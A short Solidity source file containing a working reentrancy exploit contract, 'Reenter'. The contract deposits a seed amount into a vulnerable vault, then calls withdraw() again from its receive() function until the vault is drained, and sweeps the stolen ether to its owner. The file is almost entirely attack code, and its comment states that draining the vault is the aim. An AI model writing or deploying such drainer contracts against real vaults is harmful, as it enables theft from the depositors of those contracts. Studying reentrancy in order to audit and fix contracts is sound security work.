// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

/// @notice Vault.withdraw() pays out via a raw call BEFORE zeroing the
/// balance (checks-effects-interactions violation). Re-enter withdraw()
/// from receive() until the vault is drained.
contract Reenter {
    IVault public immutable vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "need seed deposit");
        vault.deposit{value: msg.value}();
        vault.withdraw();
        // after the loop below, sweep everything to the owner
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.withdraw();
        }
    }
}
